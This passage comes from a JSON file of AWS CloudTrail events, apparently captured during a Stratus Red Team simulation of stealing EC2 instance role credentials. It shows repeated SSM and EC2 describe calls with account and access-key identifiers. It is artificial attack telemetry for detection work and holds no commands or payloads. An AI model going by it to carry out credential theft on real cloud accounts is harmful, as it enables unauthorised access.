\"AwsApiCall\",\n      \"eventVersion\": \"1.09\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"7b9d34cc-91db-4ea0-9290-2897ad31b037\",\n      \"requestParameters\": {\n         \"filterSet\": {},\n         \"instancesSet\": {}\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"TLS_AES_128_GCM_SHA256\",\n         \"clientProvidedHostHeader\": \"ec2.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.3\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"ASIAP5CT9NN8EYVU1FXV\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:sts::017622104382:assumed-role/stratus-red-team-ec2-steal-credentials-role/i-786a3A8B5C0d92eF4\",\n         \"principalId\": \"AROALHCCSKSM395EGX3XN:i-786a3A8B5C0d92eF4\",\n         \"sessionContext\": {\n            \"attributes\": {\n               \"creationDate\": \"2024-08-02T08:20:52Z\",\n               \"mfaAuthenticated\": \"false\"\n            },\n            \"ec2RoleDelivery\": \"1.0\",\n            \"sessionIssuer\": {\n               \"accountId\": \"017622104382\",\n               \"arn\": \"arn:aws:iam::017622104382:role/stratus-red-team-ec2-steal-credentials-role\",\n               \"principalId\": \"AROALHCCSKSM395EGX3XN\",\n               \"type\": \"Role\",\n               \"userName\": \"stratus-red-team-ec2-steal-credentials-role\"\n            }\n         },\n         \"type\": \"AssumedRole\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"a03d1afb-d68a-4e53-be36-17be89b1a3ee\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:54Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"d77be684-10e3-4da5-83ff-80e4abaf0818\",\n      \"requestParameters\": {\n         \"commandId\": \"f6887251-cdde-4251-a026-f50a25f521f7\",\n         \"instanceId\": \"i-786a3A8B5C0d92eF4\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"6a96b70b-0d0f-49f1-b649-b1531d02de50\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:36Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"9d0811fa-d945-4191-874a-c093553b3401\",\n      \"requestParameters\": {\n         \"commandId\": \"f6887251-cdde-4251-a026-f50a25f521f7\",\n         \"instanceId\": \"i-786a3A8B5C0d92eF4\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"7d7d6c2a-6ce0-40cf-9a83-9ceb78feafc3\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:30Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"705c99bd-7db7-434a-9678-5bcb19552940\",\n      \"requestParameters\": {\n         \"commandId\": \"f6887251-cdde-4251-a026-f50a25f521f7\",\n         \"instanceId\": \"i-786a3A8B5C0d92eF4\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4bbece4b-580c-4cfa-8b01-344774458f69\",\n      \"eventName\": \"GetCommandInvocation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:25Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"9116a326-23fa-4f00-9f81-a52882bd18f7\",\n      \"requestParameters\": {\n         \"commandId\": \"f6887251-cdde-4251-a026-f50a25f521f7\",\n         \"instanceId\": \"i-786a3A8B5C0d92eF4\"\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4b53af24-ec46-455f-9e60-f8f11235d226\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:23Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"57fdbc28-0188-4e33-8cc8-da4e0b474c52\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"2cf5bf3d-8b05-4083-89c8-d621fb29d315\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:22Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"dbf6c6cc-b01a-432c-a4d2-001e24ecbc4e\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d0239fee-4dc5-4935-b2b0-3eb443760174\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:19Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"b75f1639-567d-4ad7-9b23-0912ada17f5a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3866bd7c-83fc-443a-8390-60f8037cea91\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:18Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"bf30e76a-ab54-4d13-bed7-ad994be43b7c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"797de410-d0e0-4acf-b717-5e67ed39a467\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:17Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"7f890911-9b8f-4f97-876c-524b6d542b71\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"4c488fc8-23fc-4600-bd00-c0d51404c929\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:16Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"468b2426-d0ac-43c1-bd64-7f73ea91aa63\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"77b4b3f1-c381-4bbf-98a0-eb420141b8c4\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:14Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"4763a692-3f7e-4096-9006-cde225a71111\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"1323b061-297d-436c-909a-2052c0d47e6a\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:13Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"d9d0901b-b977-4767-86f9-821ffcecc364\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3cfc7a2b-1e74-4292-8724-8dd29e0528ab\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:12Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"739b8f1d-2162-42b1-8187-0355da517057\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-SHA\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"d7463a04-25b0-4eb2-b329-867c6f6e6e17\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:11Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"d45d33ec-f498-4137-88cf-4f04073c269a\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"3578680d-0d63-43be-8bd5-484b6106ddfa\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:10Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"5653fd0f-27ce-4ac1-9ebb-d34389b01946\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f3e31b50-d1e9-4e4f-bcdc-e1faed911fab\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:08Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"9e812fb7-0757-4659-aa0d-6c41bf6f7970\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"f48f89e8-af3b-4dea-9c5f-8f26687ade02\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:07Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"6d3d584f-5f25-478f-8549-78c410db8d14\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"00e9b1b8-2b23-4988-b872-bc650469750e\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:06Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"6c1953b3-468e-43f2-a058-2c6a926480a3\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n         ]\n      },\n      \"responseElements\": null,\n      \"sourceIPAddress\": \"18.236.253.47\",\n      \"tlsDetails\": {\n         \"cipherSuite\": \"ECDHE-RSA-AES128-GCM-SHA256\",\n         \"clientProvidedHostHeader\": \"ssm.us-north-2r.amazonaws.com\",\n         \"tlsVersion\": \"TLSv1.2\"\n      },\n      \"userAgent\": \"stratus-red-team_c763d13b-d099-488a-bb3e-f57cb2fed240\",\n      \"userIdentity\": {\n         \"accessKeyId\": \"AKIAAM80VXLJF8NPK4VC\",\n         \"accountId\": \"017622104382\",\n         \"arn\": \"arn:aws:iam::017622104382:user/christophe\",\n         \"principalId\": \"AIDASSXYG8SJ3JDII10C\",\n         \"type\": \"IAMUser\",\n         \"userName\": \"christophe\"\n      }\n   },\n   {\n      \"awsRegion\": \"us-north-2r\",\n      \"eventCategory\": \"Management\",\n      \"eventID\": \"9a691968-b92a-4218-8c3b-f9183a2db5db\",\n      \"eventName\": \"DescribeInstanceInformation\",\n      \"eventSource\": \"ssm.amazonaws.com\",\n      \"eventTime\": \"2024-08-02T08:23:05Z\",\n      \"eventType\": \"AwsApiCall\",\n      \"eventVersion\": \"1.08\",\n      \"managementEvent\": true,\n      \"readOnly\": true,\n      \"recipientAccountId\": \"017622104382\",\n      \"requestID\": \"58d7aeab-490e-4a1c-8803-5994b6ad3e9c\",\n      \"requestParameters\": {\n         \"filters\": [\n            {\n               \"key\": \"InstanceIds\",\n               \"values\": [\n                  \"i-786a3A8B5C0d92eF4\"\n               ]\n            }\n  